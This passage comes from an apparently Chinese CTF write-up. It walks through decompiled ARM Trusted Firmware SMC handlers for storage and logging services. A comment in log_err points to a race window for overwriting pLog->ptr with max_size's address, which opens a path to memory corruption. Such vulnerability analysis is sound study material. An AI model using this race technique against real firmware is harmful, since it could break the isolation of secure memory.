</span></span><span class="line"><span class="cl">  <span class="n">max_size</span> <span class="o">=</span> <span class="mi">64LL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0LL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">uintptr_t</span> <span class="nf">STORAGE_SVC_handler</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">        <span class="kt">uint32_t</span> <span class="n">smc_fid</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="kt">u_register_t</span> <span class="n">x1</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="kt">u_register_t</span> <span class="n">x2</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="kt">u_register_t</span> <span class="n">x3</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="kt">u_register_t</span> <span class="n">x4</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="kt">void</span> <span class="o">*</span><span class="n">cookie</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="kt">void</span> <span class="o">*</span><span class="n">handle</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="kt">u_register_t</span> <span class="n">flags</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">v9</span><span class="p">;</span> <span class="c1">// x0
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v10</span><span class="p">;</span> <span class="c1">// x1
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">u_register_t</span> <span class="n">size</span><span class="p">;</span> <span class="c1">// x2
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">storage_svc_t</span> <span class="o">*</span><span class="n">src</span><span class="p">;</span> <span class="c1">// x1
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">storage_svc_t</span> <span class="o">*</span><span class="n">dst</span><span class="p">;</span> <span class="c1">// x0
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">uintptr_t</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// x0
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="n">x1</span> <span class="o">&lt;=</span> <span class="mh">0xF</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="n">max_size</span> <span class="o">&gt;</span> <span class="n">x3</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="nf">is_secure</span><span class="p">(</span><span class="n">x2</span><span class="p">)</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span> <span class="n">smc_fid</span> <span class="o">==</span> <span class="mh">0xC9000031</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="n">size</span> <span class="o">=</span> <span class="n">x3</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">          <span class="n">src</span> <span class="o">=</span> <span class="p">(</span><span class="kt">storage_svc_t</span> <span class="o">*</span><span class="p">)</span><span class="n">x2</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">          <span class="n">dst</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">storage_svc_list</span><span class="p">[</span><span class="n">x1</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="k">if</span> <span class="p">(</span> <span class="n">smc_fid</span> <span class="o">!=</span> <span class="mh">0xC9000032</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">          <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">v9</span> <span class="o">=</span> <span class="s">&#34;unknown smc error</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">goto</span> <span class="n">LABEL_3</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">          <span class="p">}</span>
</span></span><span class="line"><span class="cl">          <span class="n">size</span> <span class="o">=</span> <span class="n">x3</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">          <span class="n">src</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">storage_svc_list</span><span class="p">[</span><span class="n">x1</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">          <span class="n">dst</span> <span class="o">=</span> <span class="p">(</span><span class="kt">storage_svc_t</span> <span class="o">*</span><span class="p">)</span><span class="n">x2</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="nf">memcpy</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="n">src</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">v10</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">goto</span> <span class="n">LABEL_13</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="n">v9</span> <span class="o">=</span> <span class="s">&#34;data is secure memory</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="n">v9</span> <span class="o">=</span> <span class="s">&#34;size too big</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">else</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">v9</span> <span class="o">=</span> <span class="s">&#34;idx too big</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="nl">LABEL_3</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">  <span class="nf">log_err</span><span class="p">((</span><span class="kr">__int64</span><span class="p">)</span><span class="n">v9</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">v10</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1LL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nl">LABEL_13</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">  <span class="n">result</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uintptr_t</span><span class="p">)</span><span class="n">handle</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">handle</span> <span class="o">=</span> <span class="n">v10</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div>
    </div>
</div>

<script>
function toggleCode(element) {
    const codeContent = element.nextElementSibling;
    if (codeContent.style.display === "none" || codeContent.style.display === "") {
        codeContent.style.display = "block"; 
        codeContent.parentNode.classList.remove("code-has-hidden-child");
    } else {
        codeContent.style.display = "none"; 
        codeContent.parentNode.classList.add("code-has-hidden-child");
    }
}
</script><p><code>STORAGE_SVC_handler</code>中如果报错则调用<code>log_err</code>函数，该函数中对<code>pLog</code>进行了重置、写入等操作：</p>
<div class="code-block">
    <div class="code-title" onclick="toggleCode(this)">
        
        <span class="code-block-open"><ion-icon name="chevron-down-outline"></ion-icon></span>
        <span class="code-block-close"><ion-icon name="chevron-forward-outline"></ion-icon></ion-icon></span>
        <span>c</span>
    </div>
    <div class="code-content">
        
        <div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">char</span> <span class="o">*</span><span class="kr">__fastcall</span> <span class="nf">log_err</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">s</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="o">*</span><span class="n">_s</span><span class="p">;</span> <span class="c1">// x21
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">signed</span> <span class="kt">int</span> <span class="n">s_len</span><span class="p">;</span> <span class="c1">// w19
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="o">*</span><span class="n">p_end</span><span class="p">;</span> <span class="c1">// x2
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="n">pLog</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">_s</span> <span class="o">=</span> <span class="n">s</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">s_len</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="nf">strlen</span><span class="p">(</span><span class="n">s</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="n">pLog</span><span class="o">-&gt;</span><span class="n">ptr</span> <span class="o">-</span> <span class="p">(</span><span class="n">pLog</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">)</span> <span class="o">+</span> <span class="n">s_len</span> <span class="o">+</span> <span class="mi">1</span> <span class="o">&gt;</span> <span class="mh">0x7FF</span> <span class="p">)</span> <span class="c1">// 检查是否会溢出 pLog-&gt;data
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="nf">reset_pLog</span><span class="p">();</span> <span class="c1">// 会溢出则重置 pLog-&gt;ptr = pLog-&gt;data
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">memcpy</span><span class="p">(</span><span class="n">pLog</span><span class="o">-&gt;</span><span class="n">ptr</span><span class="p">,</span> <span class="n">_s</span><span class="p">,</span> <span class="n">s_len</span><span class="p">);</span> <span class="c1">// 在reset_pLog之后，memcpy前竞争，在pLog-&gt;ptr写入max_size的地址（0xE0D70B0）
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">p_end</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">pLog</span><span class="o">-&gt;</span><span class="n">ptr</span><span class="p">[</span><span class="n">s_len</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="n">pLog</span><span class="o">-&gt;</span><span class="n">ptr</span> <span class="o">=</span> <span class="n">p_end</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="n">p_end</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span> <span class="o">=</span> <span class="n">pLog</span><span class="o">-&gt;</span><span class="n">ptr</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">pLog</span><span class="o">-&gt;</span><span class="n">ptr</span> <span class="o">=</span> <span class="n">s</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">s</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">char</span> <span class="o">*</span><span class="nf">reset_pLog</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="o">*</span><span class="n">result</span><span class="p">;</span> <span class="c1">// x0
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kr">__int8</span> <span class="o">*</span><span class="n">data</span><span class="p">;</span> <span class="c1">// x0
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="n">result</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">storage_svc_list</span><span class="p">[</span><span class="mh">0xD</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x38</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="n">pLog</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kr">__int8</span> <span class="o">*</span><span class="p">)</span><span class="n">pLog</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">pLog</span><span class="o">-&gt;</span><span class="n">ptr</span> <span class="o">=</span> <span class="n">pLog</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="nf">memset</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x800uLL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div>
    </div>
</div>

<script>
function toggleCode(element) {
    const codeContent = element.nextElementSibling;
    if (codeContent.style.display === "none" || codeContent.style.display === "") {
        codeContent.style.display = "block"; 
        codeContent.parentNode.classList.remove("code-has-hidden-child");
    } else {
        codeContent.style.display = "none"; 
        codeContent.parentNode.classList.add("code-has-hidden-child");
    }
}
</script><h3 id="log_svc">LOG_SVC<a hidden class="anchor" aria-hidden="true" href="#log_svc">#</a></h3>
<p><code>LOG_SVC</code>有2个功能：</p>
<div class="code-block">
    <div class="code-title" onclick="toggleCode(this)">
        
        <span class="code-block-open"><ion-icon name="chevron-down-outline"></ion-icon></span>
        <span class="code-block-close"><ion-icon name="chevron-forward-outline"></ion-icon></ion-icon></span>
        <span>c</span>
    </div>
    <div class="code-content">
        
        <div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kr">__int64</span> <span class="nf">LOG_SVC_init</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="n">log_svc_list</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">smc_fid</span> <span class="o">=</span> <span class="mi">2LL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">log_svc_list</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">handler</span> <span class="o">=</span> <span class="p">(</span><span class="kr">__int64</span><span class="p">)</span><span class="n">sub_E0A5838</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">log_svc_list</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="n">smc_fid</span> <span class="o">=</span> <span class="mi">3LL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">log_svc_list</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="n">handler</span> <span class="o">=</span> <span class="p">(</span><span class="kr">__int64</span><span class="p">)</span><span class="n">sub_E0A263C</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0LL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">uintptr_t</span> <span class="nf">LOG_SVC_handler</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">        <span class="kt">uint32_t</span> <span class="n">smc_fid</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="kt">u_register_t</span> <span class="n">x1</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="kt">u_register_t</span> <span class="n">x2</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="kt">u_register_t</span> <span class="n">x3</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="kt">u_register_t</span> <span class="n">x4</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="kt">void</span> <span class="o">*</span><span class="n">cookie</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="kt">void</span> <span class="o">*</span><span class="n">handle</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="kt">u_register_t</span> <span class="n">flags</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kr">__int64</span> <span class="n">v9</span><span class="p">;</span> <span class="c1">// x6
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">idx</span><span class="p">;</span> <span class="c1">// w6
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="n">log_svc_list</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">smc_fid</span> <span class="o">==</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kr">__int16</span><span class="p">)</span><span class="n">smc_fid</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">idx</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">goto</span> <span class="n">call_handler</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="n">v9</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1LL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kr">__int16</span><span class="p">)</span><span class="n">smc_fid</span> <span class="o">==</span> <span class="n">log_svc_list</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="n">smc_fid</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">idx</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nl">call_handler</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">v9</span> <span class="o">=</span> <span class="p">(</span><span class="o">*</span><span class="p">((</span><span class="kr">__int64</span> <span class="p">(</span><span class="kr">__fastcall</span> <span class="o">**</span><span class="p">)(</span><span class="kt">u_register_t</span><span class="p">,</span> <span class="kt">u_register_t</span><span class="p">,</span> <span class="kt">u_register_t</span><span class="p">,</span> <span class="kt">u_register_t</span><span class="p">))</span><span class="o">&amp;</span><span class="n">log_svc_list</span><span class="p">[</span><span class="n">idx</span><span class="p">].</span><span class="n">handler</span><span class="p">))(</span>
</span></span><span class="line"><span class="cl">           <span class="n">x1</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">           <span class="n">x2</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">           <span class="n">x3</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">           <span class="n">x4</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">handle</span> <span class="o">=</span> <span class="n">v9</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="p">(</span><span class="kt">uintptr_t</span><span class="p">)</span><span class="n">handle</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div>
    </div>
</div>

<script>
function toggleCode(element) {
    const codeContent = element.nextElementSibling;
    if (codeContent.style.display === "none" || codeContent.style.display === "") {
        codeContent.style.display = "block"; 
        codeContent.parentNode.classList.remove("code-has-hidden-child");
    } else {
        codeContent.style.display = "none"; 
        codeContent.parentNode.classList.add("code-has-hidden-child");
    }
}
</script><ol>
<li>
<p><code>smc_fid == 2</code>：</p>
<ul>
<li><code>is_secure(x1) == True</code>: <code>return 0</code></li>
<li><code>is_secure(x1) == False</code>: <code>pLog = x1; reset_pLog();</code></li>
</ul>
<div class="code-block">
    <div class="code-title" onclick="toggleCode(this)">
        
        <span class="code-block-open"><ion-icon name="chevron-down-outline"></ion-icon></span>
        <span class="code-block-close"><ion-icon name="chevron-forward-outline"></ion-icon></ion-icon></span>
        <span>c</span>
    </div>
    <div class="code-content">
        
        <div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">char</span> <span class="o">*</span><span class="kr">__fastcall</span> <span class="nf">sub_E0A5838</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">x1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">bool</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// x0
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="n">result</span> <span class="o">=</span> <span class="nf">is_secure</span><span class="p">(</span><span class="n">x1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">result</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">pLog</span> <span class="o">=</span> <span class="p">(</span><span class="kt">log_err_t</span> <span class="o">*</span><span class="p">)</span><span class="n">x1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nf">reset_pLog</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div>
    </div>
</div>

<script>
function toggleCode(element) {
    const codeContent = element.nextElementSibling;
    if (codeContent.style.display === "none" || codeContent.style.display === "") {
        codeContent.style.display = "block"; 
        codeContent.parentNode.classList.remove("code-has-hidden-child");
    } else {
        codeContent.style.display = "none"; 
        codeContent.parentNode.classList.add("code-has-hidden-child");
    }
}
</script></li>
<li>
<p><code>smc_fid == 3</code>：</p>
<ul>
<li><code>is_secure(x1) == True</code>: <code>return 0</code></li>
<li><code>is_secure(x1) == False</code>: <code>memcpy(x1, pLog-&gt;data, 0x800); reset_pLog();</code>（将<code>pLog-&gt;data</code>拷贝到<code>x1</code>）</li>
</ul>
<div class="code-block">
    <div class="code-title" onclick="toggleCode(this)">
        
        <span class="code-block-open"><ion-icon name="chevron-down-outline"></ion-icon></span>
        <span class="code-block-close"><ion-icon name="chevron-forward-outline"></ion-icon></ion-icon></span>
        <span>c</span>
    </div>
    <div class="code-content">
        
        <div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">signed</span> <span class="kr">__int64</span> <span class="kr">__fastcall</span> <span class="nf">sub_E0A263C</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">x1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">signed</span> <span class="kr">__int64</span> <span class="n">len</span><span class="p">;</span> <span class="c1">// x19
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">pLog</span> <span class="o">||</span> <span class="nf">is_secure</span><span class="p">(</span><span class="n">x1</span><span class="p">)</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0LL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">len</span> <span class="o">=</span> <span class="n">pLog</span><span class="o">-&gt;</span><span class="n">ptr</span> <span class="o">-</span> <span class="n">pLog</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="nf">memcpy</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">x1</span><span class="p">,</span> <span class="n">pLog</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">,</span> <span class="mh">0x800LL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">reset_pLog</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">len</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div>
    </div>
</div>

<script>
function toggleCode(element) {
    const codeContent = element.nextElementSibling;
    if (codeContent.style.display === "none" || codeContent.style.display === "") {
        codeContent.style.display = "block"; 
        codeContent.parentNode.classList.remove("code-has-hidden-child");
    } else {
        codeContent.style.display = "none"; 
        codeContent.parentNode.classList.add("code-has-hidden-child");
    }
}
</script></li>
</ol>
<h3 id="判断内存地址是否安全">判断内存地址是否安全<a hidden class="anchor" aria-hidden="true" href="#判断内存地址是否安全">#</a></h3>
<p><code>sub_E0A2FF8</code>函数用于判断内存地址是否安全，通过<code>0xE0AD000</code>处的结构体进行判断，并有多处交叉引用：</p>
<img src="./img/trust_storage_wp/image-20250311112608317.png" alt="image-20250311112608317" style="zoom: 67%;" />
